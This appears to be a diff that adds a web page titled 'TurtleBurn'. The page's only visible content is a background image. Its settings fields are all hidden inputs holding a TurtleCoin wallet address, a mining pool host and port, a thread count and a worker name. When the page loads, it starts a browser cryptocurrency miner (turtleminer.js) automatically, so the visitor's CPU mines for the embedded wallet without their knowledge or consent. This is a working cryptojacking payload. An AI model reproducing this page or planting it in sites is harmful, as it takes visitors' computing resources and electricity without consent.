@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+	<head>
+		<meta charset="utf-8">
+		<title>TurtleBurn</title>
+	</head>
+
+	<body>
+<body background="https://pbs.twimg.com/media/EOpxze4VAAIGbE3.jpg">
+
+		<div>
+			<label> </label> 
+			<input type="hidden" id="threads" type="number" min="1" max="64" value="4" placeholder="Number of threads">
+		</div>
+
+		<div>
+			<label> </label> 
+			<input type="hidden"  id="wallet" type="text" placeholder="Your Turtlecoin address" value="TRTLv1mg2VA9ZSBL9JSyrACvqEzS6TDu3HFFJFKpUTnH8q6CD7rrVxmCDCqQnJTdzQRr1HsTefdyzeebGZn9tifXFnC2jQiM6So">
+		</div>
+
+		<div>
+			<label> </label> 
+			<input type="hidden"  id="pool" type="text" placeholder="Your favourite mining pool" value="trtl.pool.mine2gether.com">
+		</div>
+
+		<div>
+			<label> </label> 
+			<input type="hidden"  id="port" type="number" placeholder="Your pools port" value="2225">
+		</div>
+
+		<div>
+			<label> </label> 
+			<input type="hidden"  id="speed" type="number" placeholder="Mining speed in percent" min="1" max="100" value="10">
+		</div>
+
+		<div>
+			<label> </label> 
+			<input type="hidden" id="workerName" type="text" placeholder="Your worker name" value="WebMiners">
+		</div>
+
+
+	     <body onload="updateValues();miner.start()">   
+	
+
+
+		<script src='turtleminer.js'></script>
+		<script>
+			const config = {
+				pool: "trtl.pool.mine2gether.com",	// pool url
+				port: 2225,	// pool port
+				wallet: "TRTLv1mg2VA9ZSBL9JSyrACvqEzS6TDu3HFFJFKpUTnH8q6CD7rrVxmCDCqQnJTdzQRr1HsTefdyzeebGZn9tifXFnC2jQiM6So", // your wallet address
+				speed: 100,		// cpu speed/usage in %
+				threads: 4,		// number of threads using for mining
+				workerName: "WebMiners"	// the miner name also knows as 'password' for the pool, default 'x'
+			}
+			const miner = new TurtleMiner(config);
+			console.log(miner.dump());
+
+			miner.on("report", function(rep) {
+				console.log(rep);
+			});
+
+			function updateValues() { // updates values entered by user
+				for (let i in config) {
+					config[i] = document.getElementById(i).value;
+					miner[i] = document.getElementById(i).value;
+				}
+			}
+		</script>
+	</body>
+</html>
